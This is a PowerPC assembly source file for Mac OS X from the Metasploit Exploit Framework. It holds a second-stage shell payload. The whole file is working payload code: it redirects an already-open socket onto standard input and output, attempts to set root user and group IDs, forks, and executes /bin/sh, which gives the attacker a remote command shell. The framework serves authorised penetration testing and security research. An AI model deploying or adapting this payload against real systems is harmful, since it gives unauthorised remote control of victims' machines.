;;
;
;        Name: stage_tcp_shell.asm
;   Qualities: Can Have Nulls
;   Platforms: MacOS X / PPC
;     Authors: H D Moore <hdm [at] metasploit.com>
;     Version: $Revision: 1612 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        This stub is used as a second-stage payload for the
;        read + jump stagers. Because of this, we do not care
;        about size or restricted byte content.
;
;;

.globl _main
.globl _execsh
.text

_main:

_setup_dup2:
	li	r5, 2
	
_dup2:
    li      r0, 90
    mr      r3, r30
    mr      r4, r5
    sc
    xor     r0, r0, r0
    subi    r5, r5, 1
    cmpwi   r5, -1
    bnel    _dup2


_setreuid:
	li	r0, 126
	li	r3, 0
	li 	r4, 0
	sc
	bl	_fork

_setregid:
	li	r0, 127
	li	r3, 0
	li	r4, 0
	sc
	xor 	r5, r5, r5	

_fork:
	li      r0, 2
	sc
	b	_exitproc

_execsh:
	;; based on ghandi's execve
	xor.    r5, r5, r5
	bnel    _execsh
	mflr    r3
	addi    r3, r3, 32      ; 32
	stw     r3, -8(r1)      ; argv[0] = path
	stw     r5, -4(r1)      ; argv[1] = NULL
	subi    r4, r1, 8       ; r4 = {path, 0}
	li      r0, 59
	sc                      ; execve(path, argv, NULL)
	b	_exitproc

_path:
	.asciz "/bin/sh"

_exitproc:
	li	r0, 1
	li	r3, 0
	sc
	nop
